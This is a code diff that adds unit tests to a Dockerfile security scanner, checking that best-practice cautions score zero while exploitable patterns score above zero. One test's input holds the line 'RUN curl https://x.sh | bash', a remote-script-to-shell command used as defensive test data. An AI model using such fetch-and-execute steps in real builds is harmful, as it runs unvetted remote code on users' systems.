@@ -25,6 +25,18 @@ class TestDockerfileScanner(unittest.TestCase):
         score, findings = self.scanner.scan('FROM python:latest\nUSER app\n')
         self.assertTrue(any(f[0] == 'unpinned_base_image' for f in findings))
 
+    def test_best_practice_checks_do_not_add_score(self):
+        # unpinned base image and ADD-vs-COPY are cautions, not scored findings
+        score, findings = self.scanner.scan('FROM python:latest\nUSER app\nADD app.py /app/\n')
+        categories = {f[0] for f in findings}
+        self.assertIn('unpinned_base_image', categories)
+        self.assertIn('add_vs_copy', categories)
+        self.assertEqual(score, 0)
+
+    def test_exploitable_checks_still_score(self):
+        score, findings = self.scanner.scan('FROM python:3.12-slim\nUSER app\nRUN curl https://x.sh | bash\n')
+        self.assertGreater(score, 0)
+
     def test_pinned_tag_is_not_flagged(self):
         score, findings = self.scanner.scan('FROM python:3.12-slim\nUSER app\n')
         self.assertFalse(any(f[0] == 'unpinned_base_image' for f in findings))
